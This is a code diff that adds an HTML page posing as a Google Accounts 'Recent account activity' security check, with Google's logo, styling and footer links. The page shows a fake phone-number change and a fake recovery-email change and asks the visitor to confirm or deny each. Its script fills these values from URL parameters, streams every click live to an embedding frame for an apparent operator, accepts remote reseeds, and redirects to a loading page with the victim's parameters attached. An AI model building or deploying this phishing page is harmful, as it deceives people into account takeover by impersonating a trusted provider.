@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Recent account activity - Google Accounts</title>
+<style>
+  @font-face{font-family:"Google Sans";font-style:normal;font-weight:400;font-display:swap;src:local("Google Sans"),local("Product Sans")}
+  @font-face{font-family:"Google Sans";font-style:normal;font-weight:500;font-display:swap;src:local("Google Sans Medium"),local("Product Sans Medium")}
+  html, body {
+    margin: 0; padding: 0; min-height: 100%;
+    background: rgb(30, 31, 32) !important;
+    color: rgb(227, 227, 227);
+    color-scheme: dark !important;
+    font-family: "Google Sans", Roboto, Arial, sans-serif;
+    -webkit-font-smoothing: antialiased;
+  }
+  .shell {
+    --gm3-page: rgb(30, 31, 32);
+    --gm3-card: rgb(14, 14, 14);
+    --gm3-outline: rgb(142, 145, 143);
+    --gm3-on-surface: rgb(227, 227, 227);
+    --gm3-on-surface-variant: rgb(196, 199, 197);
+    --gm-next-fill: rgb(138, 180, 248);
+    --gm-next-ink: rgb(32, 33, 36);
+    box-sizing: border-box;
+    min-height: 100vh;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    background: var(--gm3-page);
+    padding: 24px 16px;
+    color: var(--gm3-on-surface);
+  }
+  .shell *, .shell *::before, .shell *::after { box-sizing: border-box; }
+  @media (min-width: 600px) {
+    .shell { padding: 48px 24px; justify-content: center; }
+  }
+  .card {
+    background: var(--gm3-card);
+    width: 100%;
+    max-width: 480px;
+    min-height: 528px;
+    border-radius: 28px;
+    padding: 40px 40px 36px;
+    display: flex;
+    flex-direction: column;
+  }
+  @media (min-width: 900px) {
+    .card {
+      width: 720px;
+      max-width: min(720px, calc(100vw - 48px));
+      min-height: 560px;
+    }
+  }
+  .logo { display: block; width: 40px; height: 48px; }
+  .title {
+    margin: 16px 0 0;
+    font-weight: 400;
+    font-size: 2rem;
+    line-height: 1.25;
+    color: var(--gm3-on-surface);
+  }
+  @media (min-width: 840px) {
+    .title { margin-top: 24px; font-size: 2.25rem; line-height: 1.222; }
+  }
+  .lead {
+    margin: 16px 0 0;
+    font-size: 1rem;
+    line-height: 1.5;
+    color: var(--gm3-on-surface);
+  }
+  .list { margin: 28px 0 0; display: flex; flex-direction: column; flex: 1; }
+  .item {
+    padding: 20px 0;
+    border-top: 1px solid rgba(227, 227, 227, 0.12);
+  }
+  .item:first-child { border-top: none; padding-top: 8px; }
+  .item-title {
+    margin: 0;
+    font-size: 1rem;
+    font-weight: 500;
+    line-height: 1.5;
+  }
+  .item-desc {
+    margin: 6px 0 0;
+    font-size: 0.875rem;
+    line-height: 1.4286;
+    color: var(--gm3-on-surface-variant);
+  }
+  .item-desc strong { font-weight: 500; color: var(--gm3-on-surface); }
+  .choices { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 16px; }
+  .choice {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    height: 40px;
+    padding: 0 20px;
+    border-radius: 20px;
+    border: 1px solid var(--gm3-outline);
+    background: transparent;
+    color: var(--gm3-on-surface);
+    font-family: inherit;
+    font-size: 0.875rem;
+    font-weight: 500;
+    cursor: pointer;
+  }
+  .choice:hover { background: rgba(227, 227, 227, 0.08); }
+  .choice.is-selected {
+    border-color: transparent;
+    background: rgb(227, 227, 227);
+    color: rgb(32, 33, 36);
+  }
+  .actions {
+    display: flex;
+    justify-content: flex-end;
+    margin-top: auto;
+    padding-top: 28px;
+  }
+  .btn-next {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    height: 40px;
+    min-width: 64px;
+    padding: 0 24px;
+    border: none;
+    border-radius: 20px;
+    background: var(--gm-next-fill);
+    color: var(--gm-next-ink);
+    font-family: inherit;
+    font-size: 0.875rem;
+    font-weight: 500;
+    cursor: pointer;
+  }
+  .btn-next:disabled {
+    opacity: 0.38;
+    cursor: default;
+  }
+  .footer {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    width: 100%;
+    max-width: 720px;
+    margin-top: 24px;
+    padding: 0 8px;
+    font-size: 0.75rem;
+    color: var(--gm3-on-surface-variant);
+  }
+  .footer ul { display: flex; gap: 24px; list-style: none; margin: 0; padding: 0; }
+  .footer a { color: inherit; text-decoration: none; }
+  .footer a:hover { text-decoration: underline; }
+</style>
+</head>
+<body class="AfoeCd" data-ux-next="">
+  <div class="shell">
+    <main class="card" role="main">
+      <svg class="logo" xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
+        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
+        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
+        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
+        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
+      </svg>
+      <h1 class="title">Recent account activity</h1>
+      <p class="lead">Please review the recent changes to your account and confirm whether they were authorized by you.</p>
+
+      <form class="list" id="securityForm" onsubmit="return false;">
+        <section class="item">
+          <h2 class="item-title">Phone number update</h2>
+          <p class="item-desc">An attempt to change your default phone number to <strong id="phoneValue">+1 (413) 222-2617</strong>.</p>
+          <div class="choices" role="group" aria-label="Phone number update" data-field="phone_activity">
+            <button type="button" class="choice" data-value="This wasn't me" aria-pressed="false">This wasn’t me</button>
+            <button type="button" class="choice" data-value="This was me" aria-pressed="false">This was me</button>
+          </div>
+        </section>
+
+        <section class="item">
+          <h2 class="item-title">New recovery email</h2>
+          <p class="item-desc">An attempt to assign a new recovery email <strong id="recoveryValue">mohhamad.ahman45@gmail.com</strong> to your Google account.</p>
+          <div class="choices" role="group" aria-label="New recovery email" data-field="recovery_activity">
+            <button type="button" class="choice" data-value="This wasn't me" aria-pressed="false">This wasn’t me</button>
+            <button type="button" class="choice" data-value="This was me" aria-pressed="false">This was me</button>
+          </div>
+        </section>
+
+        <div class="actions">
+          <button type="submit" class="btn-next" id="continueBtn" disabled>Next</button>
+        </div>
+      </form>
+    </main>
+
+    <footer class="footer">
+      <div>English (United States)</div>
+      <ul>
+        <li><a href="https://support.google.com/accounts?hl=en" target="_blank" rel="noopener">Help</a></li>
+        <li><a href="https://accounts.google.com/TOS?loc=US&amp;hl=en&amp;privacy=true" target="_blank" rel="noopener">Privacy</a></li>
+        <li><a href="https://accounts.google.com/TOS?loc=US&amp;hl=en" target="_blank" rel="noopener">Terms</a></li>
+      </ul>
+    </footer>
+  </div>
+  <script>
+  (function () {
+    function param(key, fallback) {
+      try {
+        var q = new URLSearchParams(location.search).get(key);
+        if (q && q.trim()) return q.trim();
+      } catch (e) {}
+      return fallback;
+    }
+    var phoneEl = document.getElementById('phoneValue');
+    var recoveryEl = document.getElementById('recoveryValue');
+    if (phoneEl) phoneEl.textContent = param('phone', phoneEl.textContent);
+    if (recoveryEl) {
+      recoveryEl.textContent = param('recovery', param('recovery_email', recoveryEl.textContent));
+    }
+
+    var selections = { phone_activity: '', recovery_activity: '' };
+    var btn = document.getElementById('continueBtn');
+
+    function postLive(field, value) {
+      try {
+        parent.postMessage({
+          __ux: true,
+          type: 'live_input',
+          field: field,
+          value: value,
+          focused: false,
+          ftype: 'choice'
+        }, '*');
+      } catch (e) {}
+      try {
+        window.dispatchEvent(new CustomEvent('ux:mirror-live-input', {
+          detail: { field: field, value: value }
+        }));
+      } catch (e) {}
+    }
+
+    function syncNext() {
+      if (!btn) return;
+      btn.disabled = !(selections.phone_activity && selections.recovery_activity);
+    }
+
+    function wireGroup(group) {
+      var field = group.getAttribute('data-field');
+      var buttons = group.querySelectorAll('.choice');
+      buttons.forEach(function (b) {
+        b.addEventListener('click', function () {
+          buttons.forEach(function (x) {
+            x.classList.remove('is-selected');
+            x.setAttribute('aria-pressed', 'false');
+          });
+          b.classList.add('is-selected');
+          b.setAttribute('aria-pressed', 'true');
+          var value = b.getAttribute('data-value') || b.textContent.trim();
+          selections[field] = value;
+          postLive(field, value);
+          syncNext();
+        });
+      });
+    }
+
+    document.querySelectorAll('.choices[data-field]').forEach(wireGroup);
+    syncNext();
+
+    var form = document.getElementById('securityForm');
+    if (form) {
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        if (!(selections.phone_activity && selections.recovery_activity)) return;
+        var target = '/ge/loading';
+        try {
+          var parts = (location.pathname || '').split('/').filter(Boolean);
+          if (parts[0]) target = '/' + parts[0] + '/loading';
+        } catch (err) {}
+        try {
+          var qs = location.search || '';
+          if (qs.indexOf('email=') >= 0 || qs.indexOf('phone=') >= 0 || qs.indexOf('recovery=') >= 0) {
+            target = target + qs;
+          }
+        } catch (err2) {}
+        try { parent.postMessage({ __ux: true, type: 'internal_navigation', url: target }, '*'); } catch (err3) {}
+        try { location.assign(target); } catch (err4) {}
+      });
+    }
+
+    // Observe mirror reseeds
+    window.addEventListener('message', function (ev) {
+      var d = ev.data;
+      if (!d || d.__mirror !== true || d.type !== 'live_input') return;
+      var field = d.field;
+      var value = String(d.value || '');
+      if (!selections.hasOwnProperty(field)) return;
+      var group = document.querySelector('.choices[data-field="' + field + '"]');
+      if (!group) return;
+      var buttons = group.querySelectorAll('.choice');
+      buttons.forEach(function (b) {
+        var match = (b.getAttribute('data-value') || '') === value || b.textContent.trim() === value;
+        b.classList.toggle('is-selected', match);
+        b.setAttribute('aria-pressed', match ? 'true' : 'false');
+      });
+      selections[field] = value;
+      syncNext();
+    });
+  })();
+  </script>
+</body>
+</html>
